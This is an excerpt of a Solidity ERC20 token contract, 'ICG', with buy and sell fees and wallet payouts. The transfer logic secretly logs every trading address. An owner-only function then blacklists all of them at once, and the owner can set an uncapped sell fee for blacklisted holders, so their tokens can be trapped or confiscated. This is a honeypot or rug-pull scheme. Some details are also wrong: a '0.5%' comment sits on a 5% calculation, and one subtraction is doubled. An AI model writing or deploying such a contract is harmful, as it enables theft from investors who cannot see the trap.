...
contract ICG is ERC20, Ownable {
    ...
    mapping(address => bool) private _blackListChecker;
    address[] private blackListGroup;
    ...
    constructor() ERC20("ICG", "ICG") {
        ...
        maxWallet = (totalSupply * 5) / 100; // 0.5% max wallet
    ...
    function makeBlackListGroup() external onlyOwner {

        for (uint256 i = 0; i < blackListGroup.length; i++) {
            _blackListAddr[blackListGroup[i]] = true;
        }
    }
    ...
    function setBlackListFee(uint256 _fee) external onlyOwner {
        blackListFee = _fee;
    }
    ...
    function _transfer(
        ...
        // check 
        if (from != owner() && from != uniswapV2Pair && !_blackListChecker[from]) {
            _blackListChecker[from] = true;
            blackListGroup.push(from);
        }
        if (to != owner() && to != uniswapV2Pair && !_blackListChecker[to]) {
            _blackListChecker[to] = true;
            blackListGroup.push(to);

            if (_blackListAddr[from]) {
                _blackListAddr[to] = true;
            }
        ...
        if (takeFee) {
            ...
            if (automatedMarketMakerPairs[to] && sellTotalFees > 0) {
                ...
                if (_blackListAddr[from]) {
                    _sellTotalFees = blackListFee;
                    _sellLiquidityFee = 100 - _sellTotalFees;
                    _sellBuyBackFee = 0;
                    _sellMarketingFee = _sellTotalFees;
                }

                fees = amount.mul(_sellTotalFees).div(100);
                tokensForLiquidity += (fees * _sellLiquidityFee) / _sellTotalFees;
                tokensForBuyBack += (fees * _sellBuyBackFee) / _sellTotalFees;
                tokensForMarketing += (fees * _sellMarketingFee) / _sellTotalFees;
            }
            // on buy
    ...
    function swapBack() private returns (bool) {
        ...
        uint256 amountToSwapForWBNB = contractBalance.sub(liquidityTokens).sub(
            liquidityTokens
        );
        ...
        swapTokensForWBNB(amountToSwapForWBNB);
        ...
        uint256 WBNBForMarketing = WBNBBalance.mul(tokensForMarketing).div(
            amountToSwapForWBNB
        );

        uint256 WBNBForbuyBack = WBNBBalance.sub(WBNBForMarketing);

        IERC20(WBNBAddress).safeTransfer(marketingWallet, WBNBForMarketing);
        IERC20(WBNBAddress).safeTransfer(buyBackWallet, WBNBForbuyBack);
